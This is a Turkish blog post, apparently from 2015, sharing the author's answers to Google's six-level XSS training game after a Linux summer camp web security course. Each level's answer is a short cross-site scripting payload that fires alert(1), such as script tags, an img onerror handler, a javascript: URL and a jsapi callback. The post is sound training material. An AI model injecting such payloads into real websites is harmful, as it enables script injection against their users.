---
layout: post
title: Google XSS Oyunu ve Cevapları
date: 2015-08-27 17:45
author: ahmetgurel
comments: true
categories: [Cross site scripting, google, google xss, google xss oyunu ve cevapları, Siber Güvenlik, Web Uygulama Güvenliği, xss]
---
Bu sene <a href="https://kamp.linux.org.tr/2015/">Linux Yaz Kampında</a>  Web Uygulama Güvenliği ve Güvenli Kod Geliştirme kursuna katılma şansı yakaladım.Teoride  bildiğim bir çok şeyi uygulama,deneme fırsatı yakaladım.Bunun dışında bir çok yeni bilgil öğrendim.İmkanı olan bilgisayar ve bilişim ile ilgili bölüm okuyan,ilgi duyan herkesin bir kere Linux Yaz Kampına katılıp eğitim alması gerektiğine inanmaktayım.15 Gün boyunca sabah 9,30 akşam 9,30 eğitici ve eğlenceli bir ortam sunmakta.Bu seneki kursu veren hocalarıma <a href="https://www.mehmetince.net/">Mehmet Dursun Ince</a>,<a href="https://twitter.com/Barknkilic">Barkın Kılıç</a>,<a href="https://twitter.com/abilgegunduz">Ayşe Bilge Gündüz </a>ve misafir eğitmenimiz <a href="https://twitter.com/ucarozan">Ozan Uçar</a>'a ve kursun bir diğer misafir eğitmeni <a href="http://omercitak.com/">Ömer Çıtak'</a>a teşekkür ederim.

Şimdi gelelim asıl konumuza :) Tabiki Google'ın XSS oyunu ve Cevapları kamp esnasında XSS anlatıldıktan sonra çözmemiz istendi.Bende Soruları geçerken ki yazdığım payloadları blogumdan paylaşmak istedim :) Tabi hepsini kendim çözmedim.Soruları araştırıp çoğu konuyu beraber öğrendiğimiz sevgili ev arkadaşım,en yakın arkadaşlarımdan <a href="http://onurgurbuz.blogspot.com/">Onur Gürbüz</a>'e de teşekkür ederim :)

Google XSS Oyunu,6 soruluk ve her soruda farklı bir XSS Zaafiyetini ele alan bir sistem. <a href="https://xss-game.appspot.com/">https://xss-game.appspot.com/</a>  adresine giderek hemen çözmeye başlayabilirsiniz.

<strong>Soru 1 </strong>

[php]&lt;script&gt;alert(1)&lt;/script&gt;  [/php]

<a href="http://www.gurelahmet.com/wp-content/uploads/2015/08/11.png"><img class="alignnone size-large wp-image-463" src="http://www.gurelahmet.com/wp-content/uploads/2015/08/11-1024x580.png" alt="1" width="976" height="553" /></a>

&nbsp;

<strong>Soru 2</strong>

[php]&lt;img src=&quot;&quot; onerror=alert(1)&gt;[/php]

<a href="http://www.gurelahmet.com/wp-content/uploads/2015/08/21.png"><img class="alignnone size-large wp-image-464" src="http://www.gurelahmet.com/wp-content/uploads/2015/08/21-1024x570.png" alt="2" width="976" height="543" /></a>

&nbsp;

&nbsp;

<strong>Soru 3</strong>

[php] ')&quot;&gt;&lt;script&gt;alert(1);&lt;/script&gt; [/php]

<a href="http://www.gurelahmet.com/wp-content/uploads/2015/08/31.png"><img class="alignnone size-large wp-image-465" src="http://www.gurelahmet.com/wp-content/uploads/2015/08/31-1024x584.png" alt="3" width="976" height="557" /></a>

&nbsp;

<strong>Soru 4</strong>

[php]  '); alert(1) // [/php]

<a href="http://www.gurelahmet.com/wp-content/uploads/2015/08/4.png"><img class="alignnone size-large wp-image-466" src="http://www.gurelahmet.com/wp-content/uploads/2015/08/4-1024x579.png" alt="4" width="976" height="552" /></a>

&nbsp;

<strong>Soru 5</strong>

[php] javascript:alert(1) [/php]

<a href="http://www.gurelahmet.com/wp-content/uploads/2015/08/5.png"><img class="alignnone size-large wp-image-467" src="http://www.gurelahmet.com/wp-content/uploads/2015/08/5-1024x644.png" alt="5" width="976" height="614" /></a>

&nbsp;

<strong>Soru 6</strong>

[php] //www.google.com/jsapi?callback=alert [/php]

<a href="http://www.gurelahmet.com/wp-content/uploads/2015/08/6.png"><img class="alignnone size-large wp-image-468" src="http://www.gurelahmet.com/wp-content/uploads/2015/08/6-1024x560.png" alt="6" width="976" height="534" /></a>

&nbsp;

&nbsp;

<strong>Success!!</strong>

<a href="http://www.gurelahmet.com/wp-content/uploads/2015/08/TheEnd.png"><img class="alignnone size-large wp-image-469" src="http://www.gurelahmet.com/wp-content/uploads/2015/08/TheEnd-1024x554.png" alt="TheEnd" width="976" height="528" /></a>
